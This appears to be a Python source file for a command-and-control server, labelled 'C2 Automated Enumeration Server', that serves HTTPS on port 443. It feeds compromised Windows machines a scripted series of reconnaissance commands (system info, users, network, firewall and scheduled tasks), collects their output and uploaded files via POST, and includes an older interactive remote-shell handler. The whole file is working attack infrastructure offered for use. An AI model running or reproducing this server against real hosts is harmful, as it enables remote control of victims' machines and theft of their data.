import http.server
import os, cgi
import sys
import ssl
import time

# Generate self-signed cert
# openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# openssl x509 -text -noout -in certificate.pem
# openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
# openssl pkcs12 -in certificate.p12 -noout -info

sys_enum_commands = ["systeminfo\n",
                    "hostname\n",
                    "net users\n",
                    "ipconfig /all\n",
                    "route print\n",
                    "arp -A\n",
                    "netstat -ano\n",
                    "netsh firewall show state\n",
                    "netsh firewall show config\n",
                    "schtasks /query /fo LIST /v\n",
                    "tasklist /SVC\n",
                    "net start\n"]
                    
HOST_NAME = ''
count = 0

try:
    PORT_NUMBER = int(sys.argv[1])
except:
    print("No port specified.  Defaulting to 443/TCP")
    PORT_NUMBER = 443

class MyHandler(http.server.BaseHTTPRequestHandler):

    def old_do_GET(self):
        dir(self)
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())


    def do_GET(self):
        global count
        dir(self)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if count < len(sys_enum_commands):
            self.wfile.write(sys_enum_commands[count].encode())
            time.sleep(.3)
            count += 1
        else:
            sys.wfile.write("terminate".encode())


    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file']
                with open('./place_holder.txt', 'wb') as o:
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    httpd.count = 0
    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="./key.pem", certfile="./certificate.pem", server_side=True)
    # 
    try:
        print('[+] Starting C2 Automated Enumeration Server')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
